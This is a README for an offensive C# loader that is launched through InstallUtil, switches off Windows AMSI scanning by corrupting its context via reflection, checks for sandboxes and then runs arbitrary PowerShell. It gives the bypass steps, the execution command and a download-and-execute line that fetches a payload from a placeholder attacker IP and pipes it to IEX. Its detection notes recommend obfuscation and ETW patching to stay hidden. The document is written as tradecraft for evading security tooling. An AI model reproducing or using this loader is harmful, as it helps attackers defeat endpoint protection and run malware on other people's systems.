# Runspace Loader with C#-Native AMSI Bypass

InstallUtil-compatible C# loader that disables AMSI from C# (no PowerShell text signatures) before creating a PowerShell runspace. Use this when your payload needs to execute PowerShell commands but you want to avoid the detection signatures that come with PowerShell-based AMSI bypass scripts.

## Evasion layers

| Layer | Technique | What it evades |
|-------|-----------|----------------|
| C#-native AMSI bypass | Corrupts `AmsiUtils.amsiContext` field | PowerShell AMSI text signatures (amsi.txt, etc.) |
| No downloaded scripts | Bypass is compiled into the assembly | Network indicators from downloading bypass scripts |
| Sandbox checks | FLS callback + Sleep timing | Automated analysis environments |

## Files

| File | Purpose |
|------|---------|
| `AmsiBypass.cs` | C#-native AMSI bypass — corrupts the AMSI context via reflection |
| `Loader.cs` | InstallUtil wrapper — sandbox checks → AMSI bypass → runspace execution |
| `compile.bat` | Build script |

## Build

```batch
.\compile.bat
```

Requires: `System.Management.Automation.dll` (ships with PowerShell / .NET Framework).

## Execute

```batch
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U loader.exe
```

## How the AMSI bypass works

```
1. Type.GetType("System.Management.Automation.PSObject") — forces SMA assembly to load
2. Type.GetType("System.Management.Automation.AmsiUtils") — gets the AMSI utility type
3. GetField("amsiContext", NonPublic | Static) — gets the static context field
4. Marshal.WriteInt64(ctx + 0x8, 0) — zeros 8 bytes, corrupting the AMSI context
5. All subsequent AmsiScanBuffer calls fail silently — no AMSI scanning
```

## Usage in your payload

Edit `Loader.cs` and replace the placeholder `ps.AddScript(...)` line with your actual PowerShell:

```csharp
// Download and execute
ps.AddScript("(New-Object System.Net.WebClient).DownloadString('http://<IP>/payload.ps1') | IEX");

// Run a local script
ps.AddScript("C:\\Users\\Public\\script.ps1");

// Inline command
ps.AddScript("Get-Process | Out-File C:\\temp\\procs.txt");
```

## Detection notes

- The AMSI context corruption technique is known but the C# implementation avoids the PowerShell text signatures that `amsi.txt` and similar scripts trigger
- Combine with `Invoke-Obfuscation` if the C# assembly itself gets flagged
- The runspace still generates PowerShell event logs — consider ETW patching if that's a concern

## Requirements

- Windows 10/11 (x64)
- .NET Framework 4.x
- PowerShell (System.Management.Automation) available on the target
